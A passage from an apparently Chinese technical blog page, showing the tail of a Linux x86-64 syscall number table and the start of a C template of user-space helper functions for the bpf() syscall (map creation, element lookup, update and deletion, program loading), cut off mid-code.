<td style="text-align:center">userfaultfd</td>
<td style="text-align:center">common</td>
<td style="text-align:center">323</td>
</tr>
<tr>
<td style="text-align:center">membarrier</td>
<td style="text-align:center">common</td>
<td style="text-align:center">324</td>
</tr>
<tr>
<td style="text-align:center">mlock2</td>
<td style="text-align:center">common</td>
<td style="text-align:center">325</td>
</tr>
<tr>
<td style="text-align:center">copy_file_range</td>
<td style="text-align:center">common</td>
<td style="text-align:center">326</td>
</tr>
<tr>
<td style="text-align:center">preadv2</td>
<td style="text-align:center">64</td>
<td style="text-align:center">327</td>
</tr>
<tr>
<td style="text-align:center">pwritev2</td>
<td style="text-align:center">64</td>
<td style="text-align:center">328</td>
</tr>
<tr>
<td style="text-align:center">pkey_mprotect</td>
<td style="text-align:center">common</td>
<td style="text-align:center">329</td>
</tr>
<tr>
<td style="text-align:center">pkey_alloc</td>
<td style="text-align:center">common</td>
<td style="text-align:center">330</td>
</tr>
<tr>
<td style="text-align:center">pkey_free</td>
<td style="text-align:center">common</td>
<td style="text-align:center">331</td>
</tr>
<tr>
<td style="text-align:center">statx</td>
<td style="text-align:center">common</td>
<td style="text-align:center">332</td>
</tr>
<tr>
<td style="text-align:center">io_pgetevents</td>
<td style="text-align:center">common</td>
<td style="text-align:center">333</td>
</tr>
<tr>
<td style="text-align:center">rseq</td>
<td style="text-align:center">common</td>
<td style="text-align:center">334</td>
</tr>
<tr>
<td style="text-align:center">pidfd_send_signal</td>
<td style="text-align:center">common</td>
<td style="text-align:center">424</td>
</tr>
<tr>
<td style="text-align:center">io_uring_setup</td>
<td style="text-align:center">common</td>
<td style="text-align:center">425</td>
</tr>
<tr>
<td style="text-align:center">io_uring_enter</td>
<td style="text-align:center">common</td>
<td style="text-align:center">426</td>
</tr>
<tr>
<td style="text-align:center">io_uring_register</td>
<td style="text-align:center">common</td>
<td style="text-align:center">427</td>
</tr>
<tr>
<td style="text-align:center">open_tree</td>
<td style="text-align:center">common</td>
<td style="text-align:center">428</td>
</tr>
<tr>
<td style="text-align:center">move_mount</td>
<td style="text-align:center">common</td>
<td style="text-align:center">429</td>
</tr>
<tr>
<td style="text-align:center">fsopen</td>
<td style="text-align:center">common</td>
<td style="text-align:center">430</td>
</tr>
<tr>
<td style="text-align:center">fsconfig</td>
<td style="text-align:center">common</td>
<td style="text-align:center">431</td>
</tr>
<tr>
<td style="text-align:center">fsmount</td>
<td style="text-align:center">common</td>
<td style="text-align:center">432</td>
</tr>
<tr>
<td style="text-align:center">fspick</td>
<td style="text-align:center">common</td>
<td style="text-align:center">433</td>
</tr>
<tr>
<td style="text-align:center">pidfd_open</td>
<td style="text-align:center">common</td>
<td style="text-align:center">434</td>
</tr>
<tr>
<td style="text-align:center">clone3</td>
<td style="text-align:center">common</td>
<td style="text-align:center">435</td>
</tr>
<tr>
<td style="text-align:center">close_range</td>
<td style="text-align:center">common</td>
<td style="text-align:center">436</td>
</tr>
<tr>
<td style="text-align:center">openat2</td>
<td style="text-align:center">common</td>
<td style="text-align:center">437</td>
</tr>
<tr>
<td style="text-align:center">pidfd_getfd</td>
<td style="text-align:center">common</td>
<td style="text-align:center">438</td>
</tr>
<tr>
<td style="text-align:center">faccessat2</td>
<td style="text-align:center">common</td>
<td style="text-align:center">439</td>
</tr>
<tr>
<td style="text-align:center">process_madvise</td>
<td style="text-align:center">common</td>
<td style="text-align:center">440</td>
</tr>
<tr>
<td style="text-align:center">epoll_pwait2</td>
<td style="text-align:center">common</td>
<td style="text-align:center">441</td>
</tr>
<tr>
<td style="text-align:center">mount_setattr</td>
<td style="text-align:center">common</td>
<td style="text-align:center">442</td>
</tr>
<tr>
<td style="text-align:center">quotactl_fd</td>
<td style="text-align:center">common</td>
<td style="text-align:center">443</td>
</tr>
<tr>
<td style="text-align:center">landlock_create_ruleset</td>
<td style="text-align:center">common</td>
<td style="text-align:center">444</td>
</tr>
<tr>
<td style="text-align:center">landlock_add_rule</td>
<td style="text-align:center">common</td>
<td style="text-align:center">445</td>
</tr>
<tr>
<td style="text-align:center">landlock_restrict_self</td>
<td style="text-align:center">common</td>
<td style="text-align:center">446</td>
</tr>
<tr>
<td style="text-align:center">memfd_secret</td>
<td style="text-align:center">common</td>
<td style="text-align:center">447</td>
</tr>
<tr>
<td style="text-align:center">process_mrelease</td>
<td style="text-align:center">common</td>
<td style="text-align:center">448</td>
</tr>
<tr>
<td style="text-align:center">futex_waitv</td>
<td style="text-align:center">common</td>
<td style="text-align:center">449</td>
</tr>
<tr>
<td style="text-align:center">set_mempolicy_home_node</td>
<td style="text-align:center">common</td>
<td style="text-align:center">450</td>
</tr>
<tr>
<td style="text-align:center">rt_sigaction</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">512</td>
</tr>
<tr>
<td style="text-align:center">rt_sigreturn</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">513</td>
</tr>
<tr>
<td style="text-align:center">ioctl</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">514</td>
</tr>
<tr>
<td style="text-align:center">readv</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">515</td>
</tr>
<tr>
<td style="text-align:center">writev</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">516</td>
</tr>
<tr>
<td style="text-align:center">recvfrom</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">517</td>
</tr>
<tr>
<td style="text-align:center">sendmsg</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">518</td>
</tr>
<tr>
<td style="text-align:center">recvmsg</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">519</td>
</tr>
<tr>
<td style="text-align:center">execve</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">520</td>
</tr>
<tr>
<td style="text-align:center">ptrace</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">521</td>
</tr>
<tr>
<td style="text-align:center">rt_sigpending</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">522</td>
</tr>
<tr>
<td style="text-align:center">rt_sigtimedwait</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">523</td>
</tr>
<tr>
<td style="text-align:center">rt_sigqueueinfo</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">524</td>
</tr>
<tr>
<td style="text-align:center">sigaltstack</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">525</td>
</tr>
<tr>
<td style="text-align:center">timer_create</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">526</td>
</tr>
<tr>
<td style="text-align:center">mq_notify</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">527</td>
</tr>
<tr>
<td style="text-align:center">kexec_load</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">528</td>
</tr>
<tr>
<td style="text-align:center">waitid</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">529</td>
</tr>
<tr>
<td style="text-align:center">set_robust_list</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">530</td>
</tr>
<tr>
<td style="text-align:center">get_robust_list</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">531</td>
</tr>
<tr>
<td style="text-align:center">vmsplice</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">532</td>
</tr>
<tr>
<td style="text-align:center">move_pages</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">533</td>
</tr>
<tr>
<td style="text-align:center">preadv</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">534</td>
</tr>
<tr>
<td style="text-align:center">pwritev</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">535</td>
</tr>
<tr>
<td style="text-align:center">rt_tgsigqueueinfo</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">536</td>
</tr>
<tr>
<td style="text-align:center">recvmmsg</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">537</td>
</tr>
<tr>
<td style="text-align:center">sendmmsg</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">538</td>
</tr>
<tr>
<td style="text-align:center">process_vm_readv</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">539</td>
</tr>
<tr>
<td style="text-align:center">process_vm_writev</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">540</td>
</tr>
<tr>
<td style="text-align:center">setsockopt</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">541</td>
</tr>
<tr>
<td style="text-align:center">getsockopt</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">542</td>
</tr>
<tr>
<td style="text-align:center">io_setup</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">543</td>
</tr>
<tr>
<td style="text-align:center">io_submit</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">544</td>
</tr>
<tr>
<td style="text-align:center">execveat</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">545</td>
</tr>
<tr>
<td style="text-align:center">preadv2</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">546</td>
</tr>
<tr>
<td style="text-align:center">pwritev2</td>
<td style="text-align:center">x32</td>
<td style="text-align:center">547</td>
</tr>
</tbody>
</table>
</div>
<h4 id="BPF姿势"><a href="#BPF姿势" class="headerlink" title="BPF姿势"></a>BPF姿势</h4><p>下面是一个BPF的模板<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(!(cond)) \</span></span><br><span class="line"><span class="meta">    &#123; \</span></span><br><span class="line"><span class="meta">        printf(<span class="string">&quot;Line:%d: &#x27;%s&#x27; assertion failed\n&quot;</span>, \</span></span><br><span class="line"><span class="meta">               __LINE__, #cond); \</span></span><br><span class="line"><span class="meta">        perror(#cond); \</span></span><br><span class="line"><span class="meta">        fflush(stdout); \</span></span><br><span class="line"><span class="meta">        exit(EXIT_FAILURE); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ebpf用户态helper宏和函数</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. @cmd，表明bpf()执行的操作</span></span><br><span class="line"><span class="comment"> *      2. @attr，表明此次执行的操作的参数</span></span><br><span class="line"><span class="comment"> *      3. @size，即@attr union结构体的大小</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf</span><span class="params">(<span class="type">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(SYS_bpf, cmd, attr, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_create_map()创建一个新的map，并且返回该map对应的文件描述符</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. @map_type：即该map的类型，可以通过man bpf，搜索</span></span><br><span class="line"><span class="comment"> * bpf_map_type \&#123;关键词查看</span></span><br><span class="line"><span class="comment"> *      2. @key_size: 即map的key元素的字节数</span></span><br><span class="line"><span class="comment"> *      3. @value_size: 即map的value元素的字节数</span></span><br><span class="line"><span class="comment"> *      4. @max_entries: 这个map所允许的最大映射数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      @ret：返回相应的文件描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type,</span></span><br><span class="line"><span class="params">                   <span class="type">unsigned</span> <span class="type">int</span> key_size,</span></span><br><span class="line"><span class="params">                   <span class="type">unsigned</span> <span class="type">int</span> value_size,</span></span><br><span class="line"><span class="params">                   <span class="type">unsigned</span> <span class="type">int</span> max_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_type    = map_type,</span><br><span class="line">        .key_size    = key_size,</span><br><span class="line">        .value_size  = value_size,</span><br><span class="line">        .max_entries = max_entries</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_lookup_elem()在fd对应的map中，查找key元素为@key的映射</span></span><br><span class="line"><span class="comment"> * 的value值，并将映射的value值赋给@value</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数</span></span><br><span class="line"><span class="comment"> *      1. @fd: 要查找的map对应的文件描述符</span></span><br><span class="line"><span class="comment"> *      2. @key: 映射key元素的地址</span></span><br><span class="line"><span class="comment"> *      3. @value：映射value元素的buf地址</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      @ret：成功找到元素，则返回@value元素的字节数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_lookup_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">void</span> *value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = (__aligned_u64)key,</span><br><span class="line">        .value  = (__aligned_u64)value,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_update_elem()在fd对应的map中，创建/更新映射对</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数</span></span><br><span class="line"><span class="comment"> *      1. @fd: 要查找的map对应的文件描述符</span></span><br><span class="line"><span class="comment"> *      2. @key: 映射key元素的地址</span></span><br><span class="line"><span class="comment"> *      3. @value：映射value元素的buf地址</span></span><br><span class="line"><span class="comment"> *      4. @flags:用来设置此次操作的类型</span></span><br><span class="line"><span class="comment"> * BPF_NOEXIST，表示仅仅在@key不存在时创建映射；</span></span><br><span class="line"><span class="comment"> * BPF_EXIST，表示仅仅在@key存在是更新映射;</span></span><br><span class="line"><span class="comment"> * BPF_ANY,表示如果存在，则更新，否则创建即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      @ret:成功更新或添加则返回0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_update_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key,</span></span><br><span class="line"><span class="params">                    <span class="type">const</span> <span class="type">void</span> *value,</span></span><br><span class="line"><span class="params">                    <span class="type">uint64_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = (__aligned_u64)key,</span><br><span class="line">        .value  = (__aligned_u64)value,</span><br><span class="line">        .flags  = flags,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_delete_elem()在fd对应的map中，查找key元素为@key的映射</span></span><br><span class="line"><span class="comment"> * 并删除</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数</span></span><br><span class="line"><span class="comment"> *      1. @fd: 要查找的map对应的文件描述符</span></span><br><span class="line"><span class="comment"> *      2. @key: 映射key元素的地址</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值</span></span><br><span class="line"><span class="comment"> *      @ret: 成功找到并删除返回0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_delete_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = (__aligned_u64)key,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_prog_load将ebpf程序载入内核中执行，并返回相关的文件描述符</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. @type：即bpf程序的类型，可以通过man bpf，搜索</span></span><br><span class="line"><span class="comment"> * bpf_prog_type \&#123;关键词查看</span></span><br><span class="line"><span class="comment"> *      2. @insns: 即struct bpf_insn数组，一组指令组成一个</span></span><br><span class="line"><span class="comment"> * bpf数组</span></span><br><span class="line"><span class="comment"> *      3. @insn_cnt:即@insns数组的元素个数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      @ret: ebpf程序关联的文件描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type type,</span></span><br><span class="line"><span class="params">                  <span class="type">const</span> <span class="keyword">struct</span> bpf_insn *insns,</span></span><br><span class="line"><span class="params">                  <span class="type">int</span> insn_cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> bpf_log_size = <span class="number">0x1000</span>, ret;</span><br><span class="line">    <span class="type">char</span> *bpf_log;</span><br><span class="line"></span><br><span class="line">    assert((bpf_log = <span class="built_in">malloc</span>(bpf_log_size)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type      = type,</span><br><span class="line">        .insns          = (__aligned_u64)insns,</span><br><span class="line">        .insn_cnt       = insn_cnt,</span><br><span class="line">        .license        = (__aligned_u64)<span class="string">&quot;GPL&quot;</span>,</span><br><span class="line">        .log_buf        = (__aligned_u64)bpf_log,</span><br><span class="line">        .log_size       = bpf_log_size,</span><br><span class="line">        .log_level      = <span class="number">2</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ret = bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[bpf]\n%s\n&quot;</span>, bpf_log);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">free</span>(bpf_log);</span><br><span class="line"></span><br><span class="line">    assert(ret &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bpf_prog_load(type, insns)    \</span></span><br><span class="line"><span class="meta">        bpf_prog_load((type), (insns), \</span></span><br><span class="line"><span 